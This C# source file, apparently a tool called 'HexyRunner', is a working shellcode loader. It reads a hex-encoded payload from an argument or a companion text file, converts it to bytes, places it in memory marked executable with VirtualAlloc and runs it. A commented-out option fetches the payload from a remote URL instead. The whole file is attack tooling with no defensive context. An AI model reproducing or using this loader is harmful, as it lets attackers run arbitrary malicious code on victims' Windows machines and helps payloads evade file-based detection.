using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace HexyRunner
{
    class ShellcodeExec
    {
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr p, IntPtr s, IntPtr t, IntPtr m);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();

        private static byte[] Str2ByteArray(string hexString) {
            return Enumerable.Range(0, hexString.Length).Where(n => n % 2 == 0).Select(
                n => Convert.ToByte(hexString.Substring(n, 2), 16)
            ).ToArray();
        }

        public static void Main(string[] args)
        {

            string input;

            if (args.Length > 0) input = args[0];
            else {
                string fileName = Process.GetCurrentProcess().MainModule.FileName;
                fileName = fileName.Substring(0, fileName.LastIndexOf(".")) + ".txt";
                if (File.Exists(fileName))
                    input = File.ReadAllLines(fileName)[0].Trim();
            //  For download, uncomment the following two lines, and set the URL
            //    else using (var webClient = new WebClient())
            //        input = webClient.DownloadString("http://host/test.txt").Trim();
            }
            input = Regex.Replace(input, @"\s+", string.Empty);
            // Console.WriteLine(input);
            byte[] hexy = Str2ByteArray(input);

            IntPtr pointer = VirtualAlloc(IntPtr.Zero, (IntPtr) hexy.Length, (IntPtr) 0x1000, (IntPtr) 0x40);
            Marshal.Copy(hexy, 0, pointer, hexy.Length);
            WindowsRun runner = (WindowsRun) Marshal.GetDelegateForFunctionPointer(pointer, typeof(WindowsRun));
            runner();
        }   
    }
}
